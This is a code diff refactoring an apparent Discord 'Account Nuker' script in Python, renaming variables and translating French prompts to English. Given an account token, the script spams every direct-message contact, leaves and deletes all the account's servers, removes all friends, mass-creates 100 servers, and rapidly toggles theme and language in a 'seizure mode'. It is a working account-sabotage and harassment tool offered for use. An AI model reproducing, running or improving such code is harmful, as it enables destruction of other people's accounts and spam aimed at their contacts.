@@ -7,9 +7,11 @@ import threading
 import random
 from itertools import cycle
 
+from pystyle import Colors
+
 
 def main():
-    print("Atom Tools")
+    pass
 
 def setTitle(title):
     os.system(f"title {title}")
@@ -19,62 +21,63 @@ def clear():
 
 
 def accnuke():
-    def nuke(usertoken, Server_Name, message_Content):
+    def nuke(usertoken, server_name, message_content):
         if threading.active_count() <= 100:
-            t = threading.Thread(target=CustomSeizure, args=(usertoken, ))
+            t = threading.Thread(target=custom_seizure, args=(usertoken, ))
             t.start()
 
         headers = {'Authorization': usertoken}
-        channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers).json()
-        print(f"\nSent a Message to all available friends")
-        for channel in channelIds:
+        channel_ids = requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers).json()
+        print(f"\nSent a message to all available friends")
+        for channel in channel_ids:
             try:
-                requests.post(f'https://discord.com/api/v9/channels/'+channel['id']+'/messages', 
+                requests.post(f'https://discord.com/api/v9/channels/{channel['id']}/messages',
                 headers=headers,
-                data={"content": f"{message_Content}"})
-                print(f"\tMessaged ID: "+channel['id'])
+                data={"content": f"{message_content}"})
+                print(f"\tMessaged ID: {channel['id']}")
             except Exception as e:
-                print(f"""\tThe following error has been encountered and is being ignored: {e}""")
+                print(f"\tEncountered an error and ignored it: {e}")
 
         print(f"\nLeft all available guilds")
-        guildsIds = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers).json()
-        for guild in guildsIds:
+        guild_ids = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers).json()
+        for guild in guild_ids:
             try:
-                requests.delete(f'https://discord.com/api/v9/users/@me/guilds/'+guild['id'], headers=headers)
-                print(f"\t Left guild: "+guild['name'])
+                requests.delete(f'https://discord.com/api/v9/users/@me/guilds/{guild['id']}', headers=headers)
+                print(f"\tLeft guild: {guild['name']}")
             except Exception as e:
-                print(f"""\tThe following error has been encountered and is being ignored: {e}""")
+                print(f"\tEncountered an error and ignored it: {e}")
 
         print(f"\nDeleted all available guilds")
-        for guild in guildsIds:
+        for guild in guild_ids:
             try:
-                requests.delete(f'https://discord.com/api/v9/guilds/'+guild['id'], headers=headers)
-                print(f'\tDeleted guild: '+guild['name'])
+                requests.delete(f'https://discord.com/api/v9/guilds/{guild['id']}', headers=headers)
+                print(f'\tDeleted guild: {guild['name']}')
             except Exception as e:
-                print(f"""\tThe following error has been encountered and is being ignored: {e}""")
+                print(f"\tEncountered an error and ignored it: {e}")
 
         print(f"\nRemoved all available friends")
-        friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers).json()
-        for friend in friendIds:
+        friend_ids = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers).json()
+        for friend in friend_ids:
             try:
-                requests.delete(f'https://discord.com/api/v9/users/@me/relationships/'+friend['id'], headers=headers)
-                print(f"\tRemoved friend: "+friend['user']['username']+"#"+friend['user']['discriminator'])
+                requests.delete(f'https://discord.com/api/v9/users/@me/relationships/{friend['id']}', headers=headers)
+                print(f"\tRemoved friend: {friend['user']['username']}#{friend['user']['discriminator']}")
             except Exception as e:
-                print(f"""\tThe following error has been encountered and is being ignored: {e}""")
+                print(f"\tEncountered an error and ignored it: {e}")
 
-        print(f"\nCreated all servers")  
+        print(f"\nCreated all servers")
         for i in range(100):
             try:
-                payload = {'name': f'{Server_Name}', 'region': 'europe', 'icon': None, 'channels': []}
+                payload = {'name': f'{server_name}', 'region': 'europe', 'icon': None, 'channels': []}
                 response = requests.post('https://discord.com/api/v9/guilds', headers=headers, json=payload)
                 if response.status_code == 201:
-                    print(f"\tCreated {Server_Name} #{i}")
+                    print(f"\tCreated {server_name} #{i}")
                 else:
-                    print(f"\tFailed to create server {Server_Name} #{i}: {response.text}")
+                    print(f"\tFailed to create server {server_name} #{i}: {response.text}")
             except Exception as e:
-                print(f"""\tThe following error has been encountered and is being ignored: {e}""")
+                print(f"\tEncountered an error and ignored it: {e}")
+
         t.do_run = False
-        setting = {
+        settings = {
             'theme': "light",
             'locale': "ja",
             'message_display_compact': False,
@@ -89,36 +92,33 @@ def accnuke():
             'explicit_content_filter': '0',
             'status': "idle"
         }
-        requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=setting)
-        j = requests.get("https://discordapp.com/api/v9/users/@me", headers=headers).json()
-        a = j['u    sername'] + "#" + j['discriminator']
-        print(f"\nSuccessfully turned {a} into a holl")
+        requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=settings)
+        user_data = requests.get("https://discordapp.com/api/v9/users/@me", headers=headers).json()
+        username = user_data['username'] + "#" + user_data['discriminator']
+        print(f"\nSuccessfully turned {username} into a troll")
         input(f"\nPress ENTER to exit")
         
-    def CustomSeizure(token):
-        print(f'Starting seizure mode (Switching on/off Light/dark mode)')
+    def custom_seizure(token):
+        print(f'Starting seizure mode (Switching on/off Light/Dark mode)')
         t = threading.currentThread()
         while getattr(t, "do_run", True):
             modes = cycle(["light", "dark"])
-            setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
-            requests.patch("https://discord.com/api/v9/users/@me/settings", headers={'Authorization': usertoken}, json=setting)
+            settings = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
+            requests.patch("https://discord.com/api/v9/users/@me/settings", headers={'Authorization': usertoken}, json=settings)
 
-    print(f"\nNom des serveurs qui seront créés")
-    Server_Name = str(input(f'Nom: '))
-    print(f"\nMessage qui sera envoyé à chaque ami : ")
-    message_Content = str(input(f'Message: '))
-    r = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': usertoken})
+    server_name = str(input(f'{Colors.red} Enter the name of servers to be created: '))
+    message_content = str(input(f'{Colors.red} Message to send to each friend: '))
+    response = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': usertoken})
     threads = 100
 
     if threading.active_count() < threads:
-        threading.Thread(target=nuke, args=(usertoken, Server_Name, message_Content)).start()
+        threading.Thread(target=nuke, args=(usertoken, server_name, message_content)).start()
         return
 
 if __name__ == "__main__":
-    setTitle("Account Nuker")
     clear()
     global usertoken
-    usertoken = str(input(f"Token: "))
+    usertoken = str(input(f"{Colors.red}Token: "))
     accnuke()
 
 if __name__ == "__main__":
